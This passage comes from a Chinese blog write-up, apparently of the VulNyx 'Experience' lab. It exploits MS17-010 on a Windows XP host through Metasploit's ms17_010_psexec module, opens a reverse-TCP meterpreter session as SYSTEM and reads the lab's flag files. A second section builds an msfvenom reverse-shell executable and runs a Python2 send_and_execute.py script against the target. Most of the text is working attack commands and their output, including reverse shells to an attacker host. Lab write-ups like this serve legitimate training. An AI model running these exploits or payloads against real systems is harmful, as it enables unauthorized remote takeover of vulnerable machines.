class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                                                 Required  Description</span><br><span class="line">   ----                  ---------------                                                 --------  -----------</span><br><span class="line">   DBGTRACE              <span class="literal">false</span>                                                           <span class="built_in">yes</span>       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                                              <span class="built_in">yes</span>       How many <span class="built_in">times</span> to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank <span class="keyword">for</span> auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  <span class="built_in">yes</span>       List of named pipes to check</span><br><span class="line">   RHOSTS                10.0.3.39                                                       <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT                 445                                                             <span class="built_in">yes</span>       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                                                  no        The service display name</span><br><span class="line">   SERVICE_NAME                                                                          no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                                          <span class="built_in">yes</span>       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBDomain             .                                                               no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                               no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                               no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     10.0.3.28        <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     80               <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.3.28:80 </span><br><span class="line">[*] 10.0.3.39:445 - Target OS: Windows 5.1</span><br><span class="line">[*] 10.0.3.39:445 - Filling barrel with fish... <span class="keyword">done</span></span><br><span class="line">[*] 10.0.3.39:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br><span class="line">[*] 10.0.3.39:445 -     [*] Preparing dynamite...</span><br><span class="line">[*] 10.0.3.39:445 -             [*] Trying stick 1 (x86)...Boom!</span><br><span class="line">[*] 10.0.3.39:445 -     [+] Successfully Leaked Transaction!</span><br><span class="line">[*] 10.0.3.39:445 -     [+] Successfully caught Fish-in-a-barrel</span><br><span class="line">[*] 10.0.3.39:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span><br><span class="line">[*] 10.0.3.39:445 - Reading from CONNECTION struct at: 0x86376680</span><br><span class="line">[*] 10.0.3.39:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 10.0.3.39:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 10.0.3.39:445 - Selecting native target</span><br><span class="line">[*] 10.0.3.39:445 - Uploading payload... EGRGsAKe.exe</span><br><span class="line">[*] 10.0.3.39:445 - Created \EGRGsAKe.exe...</span><br><span class="line">[+] 10.0.3.39:445 - Service started successfully...</span><br><span class="line">[*] 10.0.3.39:445 - Deleting \EGRGsAKe.exe...</span><br><span class="line">[*] Sending stage (176198 bytes) to 10.0.3.39</span><br><span class="line">[*] Meterpreter session 2 opened (10.0.3.28:80 -&gt; 10.0.3.39:1029) at 2024-12-16 07:55:47 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">C:\WINDOWS\system32</span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> /</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">C:\</span><br><span class="line">meterpreter &gt; <span class="built_in">ls</span> </span><br><span class="line">Listing: C:\</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100777/rwxrwxrwx  0       fil   2024-01-20 22:36:42 -0500  AUTOEXEC.BAT</span><br><span class="line">100666/rw-rw-rw-  0       fil   2024-01-20 22:36:42 -0500  CONFIG.SYS</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-01-20 13:38:11 -0500  Documents and Settings</span><br><span class="line">100444/r--r--r--  0       fil   2024-01-20 22:36:42 -0500  IO.SYS</span><br><span class="line">100444/r--r--r--  0       fil   2024-01-20 22:36:42 -0500  MSDOS.SYS</span><br><span class="line">100555/r-xr-xr-x  47564   fil   2006-02-28 07:00:00 -0500  NTDETECT.COM</span><br><span class="line">040555/r-xr-xr-x  0       <span class="built_in">dir</span>   2024-01-20 13:38:13 -0500  Program Files</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-01-20 22:37:39 -0500  System Volume Information</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-12-16 23:55:46 -0500  WINDOWS</span><br><span class="line">100666/rw-rw-rw-  211     fil   2024-01-20 22:35:45 -0500  boot.ini</span><br><span class="line">100444/r--r--r--  250032  fil   2006-02-28 07:00:00 -0500  ntldr</span><br><span class="line">000000/---------  0       fif   1969-12-31 19:00:00 -0500  pagefile.sys</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">ls</span> System\ Volume\ Information\\</span><br><span class="line">Listing: System Volume Information\</span><br><span class="line">===================================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  0      fil   2024-01-20 14:32:59 -0500  MountPointManagerRemoteDatabase</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2024-12-16 23:53:05 -0500  _restore&#123;52CC55B4-4B4A-42F0-9F07-B38535228469&#125;</span><br><span class="line">100666/rw-rw-rw-  20480  fil   2024-01-20 22:37:39 -0500  tracking.log</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">ls</span> Documents\ and\ Settings\\</span><br><span class="line">Listing: Documents and Settings\</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 22:36:14 -0500  All Users</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 13:38:09 -0500  Default User</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 22:37:31 -0500  LocalService</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 22:37:23 -0500  NetworkService</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 13:38:11 -0500  bill</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> Documents\ and\ Settings\\</span><br><span class="line">meterpreter &gt; <span class="built_in">ls</span></span><br><span class="line">Listing: C:\Documents and Settings</span><br><span class="line">==================================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 22:36:14 -0500  All Users</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 13:38:09 -0500  Default User</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 22:37:31 -0500  LocalService</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 22:37:23 -0500  NetworkService</span><br><span class="line">040777/rwxrwxrwx  0     <span class="built_in">dir</span>   2024-01-20 13:38:11 -0500  bill</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">ls</span> -al bill\\</span><br><span class="line">Listing: bill\</span><br><span class="line">==============</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">040555/r-xr-xr-x  0       <span class="built_in">dir</span>   2024-01-20 13:38:13 -0500  Application Data</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-01-20 22:37:08 -0500  Cookies</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-01-21 14:41:54 -0500  Desktop</span><br><span class="line">040555/r-xr-xr-x  0       <span class="built_in">dir</span>   2024-01-20 13:38:15 -0500  Favorites</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-01-20 14:33:11 -0500  Local Settings</span><br><span class="line">040555/r-xr-xr-x  0       <span class="built_in">dir</span>   2024-01-20 13:38:14 -0500  My Documents</span><br><span class="line">100666/rw-rw-rw-  524288  fil   2024-01-21 14:55:52 -0500  NTUSER.DAT</span><br><span class="line">100666/rw-rw-rw-  1024    fil   2024-12-16 23:54:18 -0500  NTUSER.DAT.LOG</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-01-20 14:33:11 -0500  NetHood</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-01-20 14:33:11 -0500  PrintHood</span><br><span class="line">040555/r-xr-xr-x  0       <span class="built_in">dir</span>   2024-01-20 13:38:14 -0500  Recent</span><br><span class="line">040555/r-xr-xr-x  0       <span class="built_in">dir</span>   2024-01-20 13:38:12 -0500  SendTo</span><br><span class="line">040555/r-xr-xr-x  0       <span class="built_in">dir</span>   2024-01-20 14:33:11 -0500  Start Menu</span><br><span class="line">040777/rwxrwxrwx  0       <span class="built_in">dir</span>   2024-01-20 22:35:59 -0500  Templates</span><br><span class="line">100666/rw-rw-rw-  20      fil   2024-01-20 13:38:11 -0500  ntuser.ini</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">ls</span> -al bill\\Desktop\\</span><br><span class="line">Listing: bill\Desktop\</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  35    fil   2024-01-21 14:41:54 -0500  root.txt</span><br><span class="line">100666/rw-rw-rw-  35    fil   2024-01-21 14:41:28 -0500  user.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> bill\\Desktop\\</span><br><span class="line">meterpreter &gt; <span class="built_in">ls</span> -al</span><br><span class="line">Listing: C:\Documents and Settings\bill\Desktop</span><br><span class="line">===============================================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  35    fil   2024-01-21 14:41:54 -0500  root.txt</span><br><span class="line">100666/rw-rw-rw-  35    fil   2024-01-21 14:41:28 -0500  user.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">cat</span> root.txt </span><br><span class="line">c1d5e……………… </span><br><span class="line">meterpreter &gt; <span class="built_in">cat</span> user.txt </span><br><span class="line">f9e24………………</span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; ifconfig </span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">Interface  1                                                                                                                                                                                                                                                                                                                </span><br><span class="line">============                                                                                                                                                                                                                                                                                                                </span><br><span class="line">Name         : MS TCP Loopback interface                                                                                                                                                                                                                                                                                    </span><br><span class="line">Hardware MAC : 00:00:00:00:00:00                                                                                                                                                                                                                                                                                            </span><br><span class="line">MTU          : 1520                                                                                                                                                                                                                                                                                                         </span><br><span class="line">IPv4 Address : 127.0.0.1                                                                                                                                                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">Interface  2                                                                                                                                                                                                                                                                                                                </span><br><span class="line">============                                                                                                                                                                                                                                                                                                                </span><br><span class="line">Name         : Intel(R) PRO/1000 T Server Adapter - Packet Scheduler Miniport                                                                                                                                                                                                                                               </span><br><span class="line">Hardware MAC : 08:00:27:bd:31:55                                                                                                                                                                                                                                                                                            </span><br><span class="line">MTU          : 1500                                                                                                                                                                                                                                                                                                         </span><br><span class="line">IPv4 Address : 10.0.3.39                                                                                                                                                                                                                                                                                                    </span><br><span class="line">IPv4 Netmask : 255.255.255.0                                                                                                                                                                                                                                                                                                </span><br><span class="line">                                  </span><br></pre></td></tr></table></figure>
+<h3 id="python-反弹">4.2. Python 反弹</h3>
+<p>脚本：<a
+target="_blank" rel="noopener" href="https://github.com/helviojunior/MS17-010/tree/master">GitHub -
+helviojunior/MS17-010: MS17-010</a></p>
+<p>生成针对 XP 的 Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/MS17-010]</span><br><span class="line">└─<span class="comment">#  msfvenom -p windows/shell_reverse_tcp LHOST=10.0.3.28 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010-xp.exe</span></span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 324 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: ms17-010-xp.exe</span><br></pre></td></tr></table></figure>
+<p>相关脚本运行需要 <strong>Python2</strong> 安装 impacket 库</p>
+<p><strong>注，pip2 安装</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 1863k  100 1863k    0     0  37648      0  0:00:50  0:00:50 --:--:-- 26969</span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># python2 get-pip.py </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.</span></span><br><span class="line">Collecting pip&lt;21.0</span><br><span class="line">  Downloading pip-20.3.4-py2.py3-none-any.whl (1.5 MB)</span><br><span class="line">     |████████████████████████████████| 1.5 MB 217 kB/s </span><br><span class="line">Collecting wheel</span><br><span class="line">  Downloading wheel-0.37.1-py2.py3-none-any.whl (35 kB)</span><br><span class="line">Installing collected packages: pip, wheel</span><br><span class="line">Successfully installed pip-20.3.4 wheel-0.37.1</span><br></pre></td></tr></table></figure>
+<p>可能的报错及解决</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># pip2 install impacket</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.</span></span><br><span class="line">Collecting impacket</span><br><span class="line">  Using cached impacket-0.12.0.tar.gz (1.6 MB)</span><br><span class="line">    ERROR: Command errored out with <span class="built_in">exit</span> status 1:</span><br><span class="line">     <span class="built_in">command</span>: /usr/bin/python2 -c <span class="string">&#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;/tmp/pip-install-Uues_h/impacket/setup.py&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;; __file__=&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;/tmp/pip-install-Uues_h/impacket/setup.py&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;;f=getattr(tokenize, &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;open&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;, open)(__file__);code=f.read().replace(&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;\r\n&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;, &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;\n&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;);f.close();exec(compile(code, __file__, &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;exec&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;))&#x27;</span> egg_info --egg-base /tmp/pip-pip-egg-info-MZQE1W</span><br><span class="line">         cwd: /tmp/pip-install-Uues_h/impacket/</span><br><span class="line">    Complete output (10 lines):</span><br><span class="line">    /usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: <span class="string">&#x27;extras_require&#x27;</span></span><br><span class="line">      warnings.warn(msg)</span><br><span class="line">    /usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: <span class="string">&#x27;install_requires&#x27;</span></span><br><span class="line">      warnings.warn(msg)</span><br><span class="line">    usage: setup.py [global_opts] cmd1 [cmd1_opts] [cmd2 [cmd2_opts] ...]</span><br><span class="line">       or: setup.py --<span class="built_in">help</span> [cmd1 cmd2 ...]</span><br><span class="line">       or: setup.py --help-commands</span><br><span class="line">       or: setup.py cmd --<span class="built_in">help</span></span><br><span class="line">    </span><br><span class="line">    error: invalid <span class="built_in">command</span> <span class="string">&#x27;egg_info&#x27;</span></span><br><span class="line">    ----------------------------------------</span><br><span class="line">ERROR: Command errored out with <span class="built_in">exit</span> status 1: python setup.py egg_info Check the logs <span class="keyword">for</span> full <span class="built_in">command</span> output.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># pip2 install --upgrade pip==20.3.4 setuptools==44.1.1</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                                                                                                                                                                                                      </span></span><br><span class="line">Requirement already up-to-date: pip==20.3.4 <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (20.3.4)</span><br><span class="line">Collecting setuptools==44.1.1</span><br><span class="line">  Downloading setuptools-44.1.1-py2.py3-none-any.whl (583 kB)</span><br><span class="line">     |████████████████████████████████| 583 kB 28 kB/s </span><br><span class="line">Installing collected packages: setuptools</span><br><span class="line">Successfully installed setuptools-44.1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>安装 impacket 库</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install impacket==0.9.22</span><br></pre></td></tr></table></figure>
+<p>注意指定版本，新版本 impacket
+又会引入其他依赖库的兼容性问题，很麻烦……</p>
+<p><strong>反弹 Shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 send_and_execute.py 10.0.3.39 ms17-010-xp.exe</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412162156759.jpg" /></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Phantom
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Experience/" title="VulnHub - Stapler: 1">https://z9m8r8.github.io/2024/12/16/VulNyx - Experience/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+              <a href="/tags/SMB/" rel="tag"><i class="fa fa-tag"></i> SMB</a>
+              <a href="/tags/Windows/" rel="tag"><i class="fa fa-tag"></i> Windows</a>
+              <a href="/tags/MS17-010/" rel="tag"><i class="fa fa-tag"></i> MS17-010</a>
+              <a href="/tags/CVE-2017-0143/" rel="tag"><i class="fa fa-tag"></i> CVE-2017-0143</a>
+              <a href="/tags/VulNyx/" rel="tag"><i class="fa fa-tag"></i> VulNyx</a>
+              <a href="/tags/MS17-010-XP/" rel="tag"><i class="fa fa-tag"></i> MS17-010-XP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/12/13/Stapler%201/" rel="prev" title="VulnHub - Stapler: 1">
+                  <i class="fa fa-angle-left"></i> VulnHub - Stapler: 1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/12/16/VulNyx%20-%20Eternal/" rel="next" title="VulNyx - Eternal">
+                  VulNyx - Eternal <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Phantom</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">342k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">20:42</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
